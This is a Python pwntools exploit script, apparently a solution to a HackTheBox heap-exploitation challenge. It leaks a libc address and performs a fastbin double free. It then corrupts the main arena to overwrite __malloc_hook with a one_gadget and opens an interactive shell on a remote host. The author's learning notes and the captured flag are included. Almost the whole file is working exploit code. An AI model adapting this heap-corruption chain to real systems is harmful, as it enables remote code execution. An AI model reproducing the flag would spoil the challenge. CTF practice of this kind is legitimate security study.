from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes

'''
Need fastbin, paired with a leak
'''

""" r = process('./da_patched') """
r = remote('94.237.62.195', 57689)

e = ELF('./da')
libc = ELF('./glibc/libc.so.6')
# calls malloc
def summon(length, name):
    r.sendlineafter(">> ", "1")
    r.sendlineafter(": ", str(length))
    r.sendlineafter(": ", name)

# calls free 
def release(num):
    r.sendlineafter(">> ", "2")
    r.sendlineafter(": ", str(num))

# step 1: get leak for something on glibc
def get_leak():
    spell = "r3dDr4g3nst1str0f1" 
    payload1 = spell 
    payload1 = spell + "A" * (6 + 3 * 8)
    r.sendafter(": ", payload1)
    print(r.recvline())
    leak = r.recvline()[-7:-1]
    return leak


def leave():
    pass


'''
Notes:
fastbin gives a memory corruption
https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627
it's because of this as shown in the writeup
there is a line that says __builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)
https://elixir.bootlin.com/glibc/glibc-2.30/source/malloc/malloc.c <-- the glibc malloc code?
https://jackfromeast.site/2023-01/understand-the-heap-a-beautiful-mess.html
even better introduction to the heap 
why is the value 0x70 required exactly? i.e. why is this value relevant?
https://maxwelldulin.com/BlogPost/House-of-Mind-Fastbin-Variant-Revived
why are we corrupting the main arena?
it seems like we have the use the main arena because of the size thing?
maybe the 0x70 thing isn't that relevant, but there is a fastbin for each value from 0x20 -> 0x80 
althought 0x10 might still work for this
because 0x7f is everywhere 
ok i understand why 0x7f is used, but how is this related to the main arena exactly?
Not entirely sure how to deal with both i guess
How is the main arena organized exactly?
Okay, why malloc_hook - 36 though?
very confusing 
the technique that i was thinking of doesnt work because the malloc_hook is an invalid size
'''
def main():
    # is there something on the stack i can leak with this value?
    io_file_jumps = bytes_to_long(get_leak()[::-1])
    print(hex(io_file_jumps))


    # allocate A, B
    summon(0x58, "A" * 8)
    summon(0x58, "B" * 8)

    release(0)
    release(1)
    release(0)


    """ summon(12, long_to_bytes(io_file_jumps) + b'\x00\x00') """

    
    # grabbing the malloc hook
    libc_base = io_file_jumps - libc.sym.__GI__IO_file_jumps
    libc.base = libc_base
    malloc_hook = libc.base + libc.symbols['__malloc_hook']
    main_arena = libc.base + libc.symbols['main_arena']
    print("io file jumps addr: ", hex(libc.sym.__GI__IO_file_jumps))
    print("libc base: ", hex(libc_base))
    print("malloc hook: ", hex(malloc_hook))
    print("main arena: ", hex(main_arena))

    # dont find the malloc_hook pointer, instead find something above it and then keep allocating until we hit it?
    summon(0x58, p64(main_arena+0x10)) # write the forward pointer somewhere
    summon(0x58, "B")
    summon(0x58, "C") 

    summon(0x28, "D")
    summon(0x28, "E")
    release(5)
    release(6)
    release(5)
    summon(0x28, p64(0x61)) # 0x61 because that is the size we want to modify the thing into
    summon(0x28, "G")
    summon(0x28, "H")

    # after all this, we are trying to overwrite the top of the heap so that when a new chunk is allocated, from wilderness, it will be the _malloc_hook instead 
    # the offset to the wilderness is some value
    offset_to_wilderness = 0xbb8 - 0xb70 - 8 # 0x48 so need to modify the allocation to allow this 
    print("offset: ", offset_to_wilderness)
    summon (0x58, b'\x00' * offset_to_wilderness + p64(malloc_hook- 0x24)) # have to use 0x24 because we are trying to get a valid size for the wilderness area

    one_gadget = libc_base + 0xe1fa1
    summon(0x48, b'CCCCCCCCAAAA' + b'B' * 8 + p64(one_gadget)) # should overwrite the malloc_hook with this value now 
    print("final summon")
    
    """ gdb.attach(r) """
    """ time.sleep(1) """
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b'length: ', b'24')

    r.interactive()
    
    # but calling a new allocation from the wilderness is giving me a seg fault for some reason and im not sure why 
    # it could be that there is allocation before the actual allocation can occur 
    # i guess we need a size that is valid for the heap allocator? not exactly sure which values would be valid for the heap allocator though 

    # pass the check with an allocation of 0x10 since that is allowed
    
    
    # at this point, free pointer should be pointing to an allocated part of memory so we can overwrite the fd pointer to point to the leak
    # but the problem is that there is a check which restricts this 
    # flag: HTB{f45tb1n_dup_n0_tc4ch3_4_r3d_dr4g3n}

if __name__ == "__main__":
    main()

